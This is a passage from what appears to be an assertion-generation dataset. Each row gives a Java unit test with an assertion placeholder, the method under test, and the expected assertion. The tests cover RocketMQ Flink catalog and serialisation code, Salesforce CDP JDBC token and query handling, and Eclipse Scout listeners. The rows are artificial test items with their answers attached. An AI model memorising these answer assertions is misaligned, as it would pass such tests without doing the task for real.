getTable(ObjectPath tablePath) throws TableNotExistException, CatalogException { if (!tableExists(tablePath)) { throw new TableNotExistException(getName(), tablePath); } String subject = tablePath.getObjectName(); try { GetSchemaResponse getSchemaResponse = schemaRegistryClient.getSchemaBySubject(subject); if (getSchemaResponse.getType() != SchemaType.AVRO) { throw new CatalogException(""Only support avro schema.""); } return getCatalogTableForSchema(subject, getSchemaResponse); } catch (Exception e) { throw new CatalogException( String.format( ""Failed to get schema of table %s from schema registry client."", tablePath.getFullName()), e); } }"	assertNotNull(catalogBaseTable)
"testTableExists() { ObjectPath objectPath = new ObjectPath(""default"", ""test""); boolean exists = rocketMQCatalog.tableExists(objectPath); ""<AssertPlaceHolder>""; }
tableExists(ObjectPath tablePath) throws CatalogException { if (!getDefaultDatabase().equals(tablePath.getDatabaseName())) { throw new CatalogException(""Database name is not default.""); } if (StringUtils.isEmpty(tablePath.getObjectName())) { return false; } String subject = tablePath.getObjectName(); try { GetSchemaResponse getSchemaResponse = schemaRegistryClient.getSchemaBySubject(subject); if (Objects.nonNull(getSchemaResponse)) { return true; } } catch (Exception e) { throw new CatalogException( String.format( ""Failed to get schema of table %s from schema registry client."", tablePath.getFullName()), e); } return false; }"	assertTrue(exists)
"TableNotExistException { CatalogTableStatistics statistics = rocketMQCatalog.getTableStatistics(null); ""<AssertPlaceHolder>""; }
getTableStatistics(ObjectPath tablePath) throws TableNotExistException, CatalogException { return CatalogTableStatistics.UNKNOWN; }"	assertEquals(statistics, CatalogTableStatistics.UNKNOWN)
"TableNotExistException { CatalogColumnStatistics statistics = rocketMQCatalog.getTableColumnStatistics(null); ""<AssertPlaceHolder>""; }
getTableColumnStatistics(ObjectPath tablePath) throws TableNotExistException, CatalogException { return CatalogColumnStatistics.UNKNOWN; }"	assertEquals(statistics, CatalogColumnStatistics.UNKNOWN)
"PartitionNotExistException { CatalogTableStatistics statistics = rocketMQCatalog.getPartitionStatistics(null, null); ""<AssertPlaceHolder>""; }
getPartitionStatistics( ObjectPath tablePath, CatalogPartitionSpec partitionSpec) throws PartitionNotExistException, CatalogException { return CatalogTableStatistics.UNKNOWN; }"	assertEquals(statistics, CatalogTableStatistics.UNKNOWN)
"PartitionNotExistException { CatalogColumnStatistics statistics = rocketMQCatalog.getPartitionColumnStatistics(null, null); ""<AssertPlaceHolder>""; }
getPartitionColumnStatistics( ObjectPath tablePath, CatalogPartitionSpec partitionSpec) throws PartitionNotExistException, CatalogException { return CatalogColumnStatistics.UNKNOWN; }"	assertEquals(statistics, CatalogColumnStatistics.UNKNOWN)
"testSelect() { MessageQueueSelector hash = new HashMessageQueueSelector(); List<MessageQueue> queues = new ArrayList<>(); MessageQueue queue0 = new MessageQueue(""test"", ""broker-a"", 0); MessageQueue queue1 = new MessageQueue(""test"", ""broker-b"", 1); MessageQueue queue2 = new MessageQueue(""test"", ""broker-c"", 2); queues.add(queue0); queues.add(queue1); queues.add(queue2);  Message message = new Message(""test"", ""*"", ""1"", ""body"".getBytes(StandardCharsets.UTF_8));  MessageQueue messageQueue = hash.select(queues, message, 1); Assert.""<AssertPlaceHolder>""; }
select(List<MessageQueue> mqs, Message msg, Object arg) { int value = arg.hashCode() % mqs.size(); if (value < 0) { value = Math.abs(value); } return mqs.get(value); }"	assertEquals(messageQueue.getQueueId(), 1)
"testSelect() { MessageQueueSelector hash = new RandomMessageQueueSelector(); List<Integer> queueIds = new ArrayList<Integer>() { { add(0); add(1); add(2); } }; List<MessageQueue> queues = new ArrayList<>(); MessageQueue queue0 = new MessageQueue(""test"", ""broker-a"", 0); MessageQueue queue1 = new MessageQueue(""test"", ""broker-b"", 1); MessageQueue queue2 = new MessageQueue(""test"", ""broker-c"", 2); queues.add(queue0); queues.add(queue1); queues.add(queue2);  Message message = new Message(""test"", ""*"", ""1"", ""body"".getBytes(StandardCharsets.UTF_8));  MessageQueue messageQueue = hash.select(queues, message, 1); int queueId = messageQueue.getQueueId();  Assert.""<AssertPlaceHolder>""; }
select(List<MessageQueue> mqs, Message msg, Object arg) { int value = random.nextInt(mqs.size()); return mqs.get(value); }"	assertTrue(queueIds.contains(queueId))
"testDeserializeKeyAndValue() { TableSchema tableSchema = new TableSchema.Builder().field(""varchar"", DataTypes.VARCHAR(100)).build(); RowKeyValueDeserializationSchema deserializationSchema = new RowKeyValueDeserializationSchema.Builder() .setTableSchema(tableSchema) .setProperties(new HashMap<>()) .build(); MessageExt messageExt = new MessageExt(); messageExt.setBody(""test_deserialize_key_and_value"".getBytes()); RowData rowData = deserializationSchema.deserializeKeyAndValue(null, messageExt.getBody()); ""<AssertPlaceHolder>""; }
deserializeKeyAndValue(byte[] key, byte[] value) { if (isOnlyHaveVarbinaryDataField()) { GenericRowData rowData = new GenericRowData(columnSize); rowData.setField(0, value); return rowData; } else { if (value == null) { LOGGER.info(""Deserialize empty BytesMessage body, ignore the empty message.""); return null; } return deserializeValue(value); } }"	assertEquals(new String(messageExt.getBody()), rowData.getString(0).toString())
"Exception { SimpleKeyValueSerializationSchema serializationSchema = new SimpleKeyValueSerializationSchema(""id"", ""name""); SimpleKeyValueDeserializationSchema deserializationSchema = new SimpleKeyValueDeserializationSchema(""id"", ""name"");  Map<String, String> tuple = new HashMap<>(); tuple.put(""id"", ""x001""); tuple.put(""name"", ""vesense"");  ""<AssertPlaceHolder>""; }
serializeValue(Map tuple) { if (tuple == null || valueField == null) { return null; } Object value = tuple.get(valueField); return value != null ? value.toString().getBytes(StandardCharsets.UTF_8) : null; }"	assertEquals( tuple, deserializationSchema.deserializeKeyAndValue( serializationSchema.serializeKey(tuple), serializationSchema.serializeValue(tuple)))
"IOException { RocketMQSourceEnumStateSerializer serializer = new RocketMQSourceEnumStateSerializer(); RocketMQSourceEnumState expected = prepareSourceEnumeratorState(); assert expected != null; RocketMQSourceEnumState actual = serializer.deserialize(0, serializer.serialize(expected)); Assert.""<AssertPlaceHolder>""; }
serialize(RocketMQSourceEnumState enumState) throws IOException { Set<MessageQueue> assignments = enumState.getCurrentSplitAssignment();  LOG.info(""Serializer enumerator state, {}"", JSON.toJSONString(enumState));  try (ByteArrayOutputStream baos = new ByteArrayOutputStream(); DataOutputStream out = new DataOutputStream(baos)) {  out.writeInt(assignments.size()); for (MessageQueue assignment : assignments) { out.writeUTF(assignment.getBrokerName()); out.writeUTF(assignment.getTopic()); out.writeInt(assignment.getQueueId()); } out.flush();  return baos.toByteArray(); } }"	assertEquals( expected.getCurrentSplitAssignment(), actual.getCurrentSplitAssignment())
"consistentHashAllocateStrategyTest() { AllocateStrategy allocateStrategy = new ConsistentHashAllocateStrategy(); Collection<RocketMQSourceSplit> mqAll = new ArrayList<>(); for (int i = 0; i < NUM_SPLITS; i++) { mqAll.add( new RocketMQSourceSplit( PREFIX_TOPIC + (i + 1), BROKER_NAME, i, 0, SPLIT_SIZE[i])); } int parallelism = 2; Map<Integer, Set<RocketMQSourceSplit>> result = allocateStrategy.allocate(mqAll, parallelism); for (int i = 0; i < parallelism; i++) { Set<RocketMQSourceSplit> splits = result.getOrDefault(i, new HashSet<>()); for (RocketMQSourceSplit split : splits) { mqAll.remove(split); } } Assert.""<AssertPlaceHolder>""; }
allocate( final Collection<RocketMQSourceSplit> mqAll, final int parallelism) { Map<Integer, Set<RocketMQSourceSplit>> result = new HashMap<>(); for (RocketMQSourceSplit mq : mqAll) { int readerIndex = this.getSplitOwner(mq, parallelism); result.computeIfAbsent(readerIndex, k -> new HashSet<>()).add(mq); } return result; }"	assertEquals(0, mqAll.size())
"IOException { RocketMQPartitionSplitSerializer serializer = new RocketMQPartitionSplitSerializer(); RocketMQSourceSplit expected = new RocketMQSourceSplit(""test-split-serialization"", ""taobaodaily"", 256, 100, 300); RocketMQSourceSplit actual = serializer.deserialize(serializer.getVersion(), serializer.serialize(expected)); ""<AssertPlaceHolder>""; }
serialize(RocketMQSourceSplit split) throws IOException { try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); DataOutputStream out = new DataOutputStream(byteArrayOutputStream)) { out.writeUTF(split.getTopic()); out.writeUTF(split.getBrokerName()); out.writeInt(split.getQueueId()); out.writeLong(split.getStartingOffset()); out.writeLong(split.getStoppingOffset()); out.flush(); return byteArrayOutputStream.toByteArray(); } }"	assertEquals(expected, actual)
"RopDecodeException { ByteBuffer buffer = groupOffsetKey.encode(); buffer.rewind(); GroupMetaKey metaKey = GroupMetaKey.decodeKey(buffer); ""<AssertPlaceHolder>""; }
encode() throws RopEncodeException { if (Strings.isNullOrEmpty(topicName)) { throw new RopEncodeException(""GroupOffsetKey subTopic can't be null or empty""); }  try { byte[] topicBytes = topicName.getBytes(StandardCharsets.UTF_8); ByteBuffer byteBuffer = ByteBuffer.allocate(estimateSize()); super.encode(byteBuffer); byteBuffer.putInt(pulsarPartitionId); byteBuffer.putInt(topicBytes.length); byteBuffer.put(topicBytes); return byteBuffer; } catch (Exception e) { throw new RopEncodeException(""GroupOffsetKey encode error: "" + e.getMessage()); } }"	assertEquals(groupOffsetKey, metaKey)
"RopDecodeException { ByteBuffer buffer = groupOffsetValue.encode(); buffer.rewind(); GroupOffsetValue temp = new GroupOffsetValue(); temp.decode(buffer); ""<AssertPlaceHolder>""; }
decode(ByteBuffer buffer) throws RopDecodeException { try { this.version = buffer.getShort(GROUP_OFFSET_VALUE_VERSION_POS); this.offset = buffer.getLong(GROUP_OFFSET_VALUE_OFFSET_POS); this.commitTimestamp = buffer.getLong(GROUP_OFFSET_VALUE_COMMIT_TIMESTAMP_POS); this.expireTimestamp = buffer.getLong(GROUP_OFFSET_VALUE_EXPIRE_TIMESTAMP_POS); return this; } catch (Exception e) { throw new RopDecodeException(""GroupOffsetValue decode error: "" + e.getMessage()); } }"	assertEquals(groupOffsetValue, temp)
"testTaskExpiration() { final List<Integer> output = new ArrayList<>(); final List<TestTask> tasks = new ArrayList<>(); final List<Integer> ids = new ArrayList<>(); final List<CountDownLatch> latches = IntStream.range(0, 5).mapToObj(i -> { CountDownLatch latch = new CountDownLatch(1); tasks.add(new TestTask(i, i, latch, output)); ids.add(i); return latch; }).collect(Collectors.toList()); latches.addAll(IntStream.range(10, 100).mapToObj(i -> { CountDownLatch latch = new CountDownLatch(1); tasks.add(new TestTask(i, i, latch, output)); tasks.add(new TestTask(i, i, latch, output)); ids.add(i); ids.add(i); return latch; }).collect(Collectors.toList())); latches.addAll(IntStream.range(100, 500).mapToObj(i -> { CountDownLatch latch = new CountDownLatch(1); tasks.add(new TestTask(i, i, latch, output)); ids.add(i); return latch; }).collect(Collectors.toList()));  // randomly submit requests tasks.forEach(task -> timer.add(task));  while (timer.advanceClock(2000)) { }  latches.forEach(latch -> { try { latch.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); fail(""Should not reach here""); } });  Collections.sort(ids); ""<AssertPlaceHolder>""; }
advanceClock(long timeoutMs);"	"assertEquals( ""output should match"", ids, output )"
"Exception { interpreter.startInteractiveSession();  inputWriter.write(""puts 'test print'\n""); inputWriter.flush(); outputReader.readLine();  ""<AssertPlaceHolder>""; }
startInteractiveSession() { irbThread.start(); }"	"assertEquals(""The output should be printed"", ""test print"", outputReader.readLine())"
"TokenException { OkHttpClient mockHttpClient = mock(OkHttpClient.class); Properties mockProperties = mock(Properties.class); when(mockProperties.getProperty(eq(LOGIN_URL))).thenReturn(""https://login.salesforce.com""); TokenExchangeHelper tokenExchangeHelper = new TokenExchangeHelper(mockProperties, mockHttpClient);  CoreToken mockCoreToken = mock(CoreToken.class); when(mockCoreToken.getInstanceUrl()).thenReturn(""https://tenant-instance.com"");  try { tokenExchangeHelper.exchangeToken(mockCoreToken); } catch (Exception e) { // Not worried about the exception as we are checking only // whether the instance url is used for exchange }  verify(mockCoreToken, Mockito.times(1)).getInstanceUrl(); ArgumentCaptor<Request> captor = ArgumentCaptor.forClass(Request.class); verify(mockHttpClient, Mockito.times(1)).newCall(captor.capture());  ""<AssertPlaceHolder>""; }
exchangeToken(CoreToken coreToken) throws TokenException { log.info(""Exchanging core token for cdp token""); OffcoreToken offcoreToken = exchangeToken(coreToken.getInstanceUrl(), coreToken.getAccessToken(), properties.getProperty(Constants.DATASPACE)); log.info(""Finished exchanging core token for CDP token""); return offcoreToken; }"	"assertThat(captor.getValue().url().toString()) .isEqualTo(""https://tenant-instance.com/services/a360/token"")"
"TokenException { Properties properties = new Properties(); properties.put(""loginURL"", ""https://login.salesforce.com""); properties.put(""clientId"", ""somerandomclientid""); properties.put(""userName"", ""someusername""); properties.put(""privateKey"", ""someprivatekey""); JwtLoginClient mockJwtLoginClient = Mockito.mock(JwtLoginClient.class); TokenExchangeHelper mockTokenExchangeHelper = Mockito.mock(TokenExchangeHelper.class); CoreToken mockToken = new CoreToken(); mockToken.setAccessToken(""access_token""); Mockito.when(mockJwtLoginClient.keyPairAuthLogin(anyString(),anyString(),anyString(),anyString(),anyString(),anyString())) .thenReturn(mockToken); JwtTokenFlow jwtCoreTokenProvider = new JwtTokenFlow(properties, mockJwtLoginClient, mockTokenExchangeHelper); CoreToken coreToken = jwtCoreTokenProvider.getCoreToken(); Assertions.""<AssertPlaceHolder>""; }
getCoreToken() throws TokenException { validateProperties(properties); String token_url = properties.getProperty(Constants.LOGIN_URL) + Constants.CORE_TOKEN_URL; try { String audience = getAudienceForJWTAssertion(properties.getProperty(Constants.LOGIN_URL));  // And handle the initial login *without* immutables. This ensures that nothing // is allocated in memory that cannot be cleared on demand, and thus we aren't // at the garbage collectors mercy. return client.keyPairAuthLogin(Constants.TOKEN_GRANT_TYPE_JWT_BEARER, properties.getProperty(Constants.CLIENT_ID), properties.getProperty(Constants.USER_NAME), properties.getProperty(Constants.PRIVATE_KEY), audience, token_url);  } catch (SQLException sqlException) { log.error(""Caught exception while setting audience for JWT assertion"", sqlException); throw new TokenException(TOKEN_FETCH_FAILURE, sqlException); } catch (Exception e) { log.error(""Caught exception while retrieving the token"", e); throw new TokenException(TOKEN_FETCH_FAILURE, e); } }"	assertThat(coreToken).isEqualTo(mockToken)
"TokenException { Properties properties = new Properties(); properties.put(""loginURL"", ""https://login.salesforce.com""); properties.put(""clientId"", ""somerandomclientid""); properties.put(""userName"", ""someusername""); properties.put(""clientSecret"", ""someclientsecret""); properties.put(Constants.PD, ""somepd"");  UnPwdAuthClient unPwdAuthClient = Mockito.mock(UnPwdAuthClient.class); TokenExchangeHelper mockTokenExchangeHelper = Mockito.mock(TokenExchangeHelper.class); CoreToken mockToken = new CoreToken(); mockToken.setAccessToken(""some_token"");  Mockito.when(unPwdAuthClient.un_pw_login(anyString(),anyString(),anyObject(),anyString(),anyObject(), anyString())).thenReturn(mockToken); UnPwdTokenFlow unPwdTokenFlow = new UnPwdTokenFlow(properties, unPwdAuthClient, mockTokenExchangeHelper);  CoreToken coreToken = unPwdTokenFlow.getCoreToken(); Assertions.""<AssertPlaceHolder>""; }
getCoreToken() throws TokenException { log.info(""Getting core token using username password flow""); validateProperties(); String token_url = properties.getProperty(Constants.LOGIN_URL) + Constants.CORE_TOKEN_URL; log.info(""Fetching core token from url: {}"", token_url); byte[] passwordBytes = null; byte[] clientSecret = null; // Convert the password and client secret to byte arrays so, we can empty them at will. try { passwordBytes = Utils.safeByteArrayUrlEncode(Utils.asByteArray(properties.getProperty(Constants.PD))); clientSecret = Utils.asByteArray(properties.getProperty(Constants.CLIENT_SECRET));  // And handle the initial login *without* immutables. This ensures that nothing // is allocated in memory that cannot be cleared on demand, and thus we aren't // at the garbage collectors mercy. return client.un_pw_login(Constants.TOKEN_GRANT_TYPE_PD, properties.getProperty(Constants.CLIENT_ID), clientSecret, properties.getProperty(Constants.USER_NAME), passwordBytes, token_url);  } catch (IOException e) { log.error(""Caught exception while retrieving the token"", e); throw new TokenException(TOKEN_FETCH_FAILURE, e); } finally { fillArray(passwordBytes, (byte) 0); fillArray(clientSecret, (byte)0); } }"	assertThat(coreToken).isEqualTo(mockToken)
"SQLException { String jsonString = INTERNAL_SERVER_ERROR.getResponse(); Response response = new Response.Builder().code(HttpStatus.SC_UNAUTHORIZED). request(buildRequest()).protocol(Protocol.HTTP_1_1). message(""Unauthorized""). body(ResponseBody.create(jsonString, MediaType.parse(""application/json""))).build(); doReturn(response).when(queryExecutor).getMetadata();  Throwable ex = catchThrowableOfType(() -> { queryServiceMetadata.getTables("""", """", """", new String [0]); }, SQLException.class); ""<AssertPlaceHolder>""; }
getTables(String catalog, String dataspace, String tableNamePattern, String[] types) throws SQLException { if(StringUtils.isNotBlank(dataspace) && StringUtils.isBlank(queryServiceConnection.getDataspace())){ queryServiceConnection.setDataspace(dataspace); log.info(""Selected dataspace :""+dataspace); } else if(StringUtils.isNotBlank(dataspace) &&  !dataspace.equals(queryServiceConnection.getDataspace())){ throw new SQLException(""Dataspace cannot be changed in the same connections""); } MetadataResponse metadataResponse = getMetadataResponse(); return createTableResultSet(metadataResponse, tableNamePattern); }"	"assertThat(ex.getMessage()).contains(""Failed to get the metadata. Please try again"")"
"SQLException { String jsonString = NOT_FOUND.getResponse(); Response response = new Response.Builder().code(HttpStatus.SC_NOT_FOUND). request(buildRequest()).protocol(Protocol.HTTP_1_1). message(""Not Found""). body(ResponseBody.create(jsonString, MediaType.parse(""application/json""))).build(); doReturn(response).when(queryExecutor).getMetadata();  Throwable ex = catchThrowableOfType(() -> { queryServiceMetadata.getColumns("""", """", """", """"); }, SQLException.class); ""<AssertPlaceHolder>""; }
getColumns(String catalog, String schemaPattern, String tableNamePattern, String columnNamePattern) throws SQLException { MetadataResponse metadataResponse = getMetadataResponse(); return createColumnResultSet(metadataResponse, tableNamePattern); }"	assertThat(ex.getMessage()).contains(METADATA_EXCEPTION)
"SQLException { String jsonString = TABLE_METADATA.getResponse(); Response response = new Response.Builder().code(HttpStatus.SC_OK). request(buildRequest()).protocol(Protocol.HTTP_1_1). message(""Successful""). body(ResponseBody.create(jsonString, MediaType.parse(""application/json""))).build(); doReturn(response).when(queryExecutor).getMetadata(); ResultSet resultSet = queryServiceMetadata.getColumns("""", """", ""Individual__dlm"", """"); Assert.""<AssertPlaceHolder>""; }
getColumns(String catalog, String schemaPattern, String tableNamePattern, String columnNamePattern) throws SQLException { MetadataResponse metadataResponse = getMetadataResponse(); return createColumnResultSet(metadataResponse, tableNamePattern); }"	assertFalse(resultSet.next())
"IOException { String jsonString = ResponseEnum.UNAUTHORIZED.getResponse(); Response response = new Response.Builder().code(HttpStatus.SC_UNAUTHORIZED). request(buildRequest()).protocol(Protocol.HTTP_1_1). message(""Unauthorized""). body(ResponseBody.create(jsonString, MediaType.parse(""application/json""))).build(); doReturn(response).when(queryExecutor).executeQuery(anyString(), anyBoolean(), any(Optional.class), any(Optional.class), any(Optional.class));  Throwable ex = catchThrowableOfType(() -> { queryServiceStatement.executeQuery(""select FirstName__c from Individual__dlm limit 10""); }, SQLException.class); Assertions.""<AssertPlaceHolder>""; }
executeQuery(String sql) throws SQLException { resultSet = super.executeQuery(sql); return resultSet; }"	"assertThat(ex.getMessage()).contains(""Failed to get the response for the query. Please try again."")"
"SQLException { String jsonString = ResponseEnum.EMPTY_RESPONSE.getResponse(); Response response = new Response.Builder().code(HttpStatus.SC_OK). request(buildRequest()).protocol(Protocol.HTTP_1_1). message(""Successful""). body(ResponseBody.create(jsonString, MediaType.parse(""application/json""))).build(); doReturn(response).when(queryExecutor).executeQuery(anyString(), anyBoolean(), any(Optional.class), any(Optional.class), any(Optional.class)); ResultSet resultSet = queryServiceStatement.executeQuery(""select TelephoneNumber__c from ContactPointPhone__dlm GROUP BY 1""); Assert.""<AssertPlaceHolder>""; }
executeQuery(String sql) throws SQLException { resultSet = super.executeQuery(sql); return resultSet; }"	assertFalse(resultSet.next())
"SQLException { doThrow(new IOException(""IO Exception"")).when(queryExecutor).executeQuery(anyString(), anyBoolean(), any(Optional.class), any(Optional.class), any(Optional.class)); Throwable ex = catchThrowableOfType(() -> { queryServiceStatement.executeQuery(""select FirstName__c from Individual__dlm limit 10""); }, SQLException.class); Assertions.""<AssertPlaceHolder>""; }
executeQuery(String sql) throws SQLException { resultSet = super.executeQuery(sql); return resultSet; }"	assertThat(ex.getMessage()).contains(QUERY_EXCEPTION)
"IOException { doReturn(buildResponse(429, TOO_MANY_REQUESTS)).when(chain).proceed(any(Request.class)); Response response = retryInterceptor.intercept(chain); verify(chain, times(4)).proceed(any(Request.class)); Assert.""<AssertPlaceHolder>""; }
intercept(@NotNull Chain chain) throws IOException{ Request request = chain.request(); Response response = proceedWithRequest(chain, request);  // TODO: Make it expo backoff if needed. for(int retryCount = 1; (response == null || Utils.getRetryStatusCodes().contains(response.code())) && retryCount <= this.maxRetryCount; response = this.proceedWithRequest(chain, request)) { int code = 500; String msg = """"; if (response != null) { code = response.code(); msg = response.message(); response.close(); }  log.error(""Request failed with response code {}, msg {}. Number of request retry {}"", code, msg, retryCount); ++retryCount; }  if(response==null) { throw new IOException(""failed to execute the request.""); }  return response; }"	assertEquals(response.code(), 429)
"testListenerInModelJob_MultipleSessions() { final AbstractObservableNotificationHandler<Serializable> testHandler = createGlobalHandler();  ModelJobs.schedule(() -> { final CountCondition cc = new CountCondition(2); testHandler.addListener(m_testSession1, createVerifyingListener(cc, m_testSession1)); testHandler.addListener(m_testSession2, createVerifyingListener(cc, m_testSession2)); testHandler.notifyListenersOfAllSessions(m_testNotification); ""<AssertPlaceHolder>""; cc.waitFor(); }, ModelJobs .newInput(ClientRunContexts.empty().withSession(m_testSession1, true))) .awaitDone(); }
notifyListenersOfAllSessions(final T notification) { // create copy of m_listeners (EventListenerList is thread-safe) Map<IClientSession, FastListenerList<INotificationListener<T>>> listenerCopy; synchronized (m_listeners) { listenerCopy = new HashMap<>(m_listeners); }  //schedule model job per session to handle notifications listenerCopy.forEach((session, listenerList) -> scheduleHandlingNotifications(notification, listenerList, session)); }"	assertEquals(m_testSession1, IClientSession.CURRENT.get())
"testRemove_SingleListener() { final AbstractObservableNotificationHandler<Serializable> testHandler = createGlobalHandler(); @SuppressWarnings(""unchecked"") INotificationListener<Serializable> l1 = mock(INotificationListener.class); testHandler.addListener(m_testSession1, l1); testHandler.removeListener(m_testSession1, l1); ""<AssertPlaceHolder>""; }
getListeners(IClientSession session) { synchronized (m_listeners) { FastListenerList<INotificationListener<T>> listeners = m_listeners.get(session); if (listeners != null) { return listeners.list(); } else { return Collections.emptyList(); } } }"	assertEquals(0, testHandler.getListeners(m_testSession1).size())
"testRemoveNonExisting() { final AbstractObservableNotificationHandler<Serializable> testHandler = createGlobalHandler(); @SuppressWarnings(""unchecked"") INotificationListener<Serializable> l1 = mock(INotificationListener.class); testHandler.removeListener(m_testSession1, l1); ""<AssertPlaceHolder>""; }
getListeners(IClientSession session) { synchronized (m_listeners) { FastListenerList<INotificationListener<T>> listeners = m_listeners.get(session); if (listeners != null) { return listeners.list(); } else { return Collections.emptyList(); } } }"	assertEquals(0, testHandler.getListeners(m_testSession1).size())
"testSessionStopped() { final AbstractObservableNotificationHandler<Serializable> testHandler = createGlobalHandler(); @SuppressWarnings(""unchecked"") INotificationListener<Serializable> l1 = mock(INotificationListener.class); testHandler.addListener(m_testSession1, l1); SessionEvent sessionStopEvent = new SessionEvent(m_testSession1, SessionEvent.TYPE_STOPPED); testHandler.sessionChanged(sessionStopEvent); ""<AssertPlaceHolder>""; }
getListeners(IClientSession session) { synchronized (m_listeners) { FastListenerList<INotificationListener<T>> listeners = m_listeners.get(session); if (listeners != null) { return listeners.list(); } else { return Collections.emptyList(); } } }"	assertEquals(0, testHandler.getListeners(m_testSession1).size())
"DeepLinkException { m_deepLinks.handleDeepLink(""foobar-123""); FooBarDeepLinkHandler handler = BEANS.get(FooBarDeepLinkHandler.class); ""<AssertPlaceHolder>""; }
handleDeepLink(String deepLinkPath) throws DeepLinkException { for (IDeepLinkHandler handler : m_handlers) { if (handler.handle(deepLinkPath)) { return true; } } return false; }"	"assertEquals(""123"", handler.getLastMatch())"
"testListBox() { AbstractListBox<Long> listBox = new MyListBox(); listBox.init(); runBasicAsserts(listBox); listBox.setValue(new HashSet<>(Arrays.asList(2L))); m_searchFilterService.applySearchDelegate(listBox, m_searchFilter, false); Assert.""<AssertPlaceHolder>""; }
applySearchDelegate(IFormField field, SearchFilter search, boolean includeChildren) { String label = field.getLabel(); if (field.getParentField() instanceof ISequenceBox && field.getParentField() instanceof AbstractFormField) { AbstractFormField range = (AbstractFormField) field.getParentField(); if (range.getInitialLabel() != null) { label = range.getInitialLabel() + (StringUtility.isNullOrEmpty(label) ? """" : "" "" + label); } } label = StringUtility.nullIfEmpty(label);  //list box if (field instanceof AbstractListBox<?>) { AbstractListBox<?> valueField = (AbstractListBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //tree box if (field instanceof AbstractTreeBox<?>) { AbstractTreeBox<?> valueField = (AbstractTreeBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //string, html, label field if (field instanceof AbstractStringField || field instanceof AbstractHtmlField || field instanceof AbstractLabelField) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicLike"") + "" "") + valueField.getDisplayText()); } return; } //boolean field if (field instanceof AbstractBooleanField) { AbstractBooleanField valueField = (AbstractBooleanField) field; if (valueField.getValue() != null && valueField.getValue() && label != null) { search.addDisplayText(label); } return; } //radiobuttongroup field if (field instanceof AbstractRadioButtonGroup<?>) { AbstractRadioButtonGroup<?> valueField = (AbstractRadioButtonGroup<?>) field; if (valueField.getValue() != null) { IRadioButton<?> selectedButton = valueField.getSelectedButton(); String valueLabel = (selectedButton != null ? selectedButton.getLabel() : null); if (valueLabel == null) { if (label != null) { search.addDisplayText(label); } } else { search.addDisplayText(StringUtility.box("""", label, "" = "") + valueLabel); } } return; } //value field if (field instanceof AbstractValueField<?>) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicEQ"") + "" "") + valueField.getDisplayText()); } return; }  if (includeChildren) { applySearchDelegateForChildren(field, search); } }"	"assertEquals(LABEL + "" "" + TEXTS.get(""LogicIn"") + "" "" + listBox.getDisplayText(), m_searchFilter.getDisplayTextsPlain())"
"testTreeBox() { AbstractTreeBox<Long> treeBox = new MyTreeBox(); treeBox.init(); runBasicAsserts(treeBox); treeBox.setValue(new HashSet<>(Arrays.asList(2L))); m_searchFilterService.applySearchDelegate(treeBox, m_searchFilter, false); Assert.""<AssertPlaceHolder>""; }
applySearchDelegate(IFormField field, SearchFilter search, boolean includeChildren) { String label = field.getLabel(); if (field.getParentField() instanceof ISequenceBox && field.getParentField() instanceof AbstractFormField) { AbstractFormField range = (AbstractFormField) field.getParentField(); if (range.getInitialLabel() != null) { label = range.getInitialLabel() + (StringUtility.isNullOrEmpty(label) ? """" : "" "" + label); } } label = StringUtility.nullIfEmpty(label);  //list box if (field instanceof AbstractListBox<?>) { AbstractListBox<?> valueField = (AbstractListBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //tree box if (field instanceof AbstractTreeBox<?>) { AbstractTreeBox<?> valueField = (AbstractTreeBox<?>) field; if (!valueField.getValue().isEmpty()) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicIn"") + "" "") + valueField.getDisplayText()); } return; } //string, html, label field if (field instanceof AbstractStringField || field instanceof AbstractHtmlField || field instanceof AbstractLabelField) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicLike"") + "" "") + valueField.getDisplayText()); } return; } //boolean field if (field instanceof AbstractBooleanField) { AbstractBooleanField valueField = (AbstractBooleanField) field; if (valueField.getValue() != null && valueField.getValue() && label != null) { search.addDisplayText(label); } return; } //radiobuttongroup field if (field instanceof AbstractRadioButtonGroup<?>) { AbstractRadioButtonGroup<?> valueField = (AbstractRadioButtonGroup<?>) field; if (valueField.getValue() != null) { IRadioButton<?> selectedButton = valueField.getSelectedButton(); String valueLabel = (selectedButton != null ? selectedButton.getLabel() : null); if (valueLabel == null) { if (label != null) { search.addDisplayText(label); } } else { search.addDisplayText(StringUtility.box("""", label, "" = "") + valueLabel); } } return; } //value field if (field instanceof AbstractValueField<?>) { AbstractValueField<?> valueField = (AbstractValueField<?>) field; if (valueField.getValue() != null) { search.addDisplayText(StringUtility.box("""", label, "" "" + TEXTS.get(""LogicEQ"") + "" "") + valueField.getDisplayText()); } return; }  if (includeChildren) { applySearchDelegateForChildren(field, search); } }"	"assertEquals(LABEL + "" "" + TEXTS.get(""LogicIn"") + "" "" + treeBox.getDisplayText(), m_searchFilter.getDisplayTextsPlain())"
"testLabelField() { AbstractLabelField labelField = new MyLabelField(); labelField.init(); runBasicAsserts(labelField); labelField.setValue(""value""); m_searchFilterService.applySearchDelegate(labelField, m_searchFilter, false); Assert.""<AssertPlaceHolder>""; }
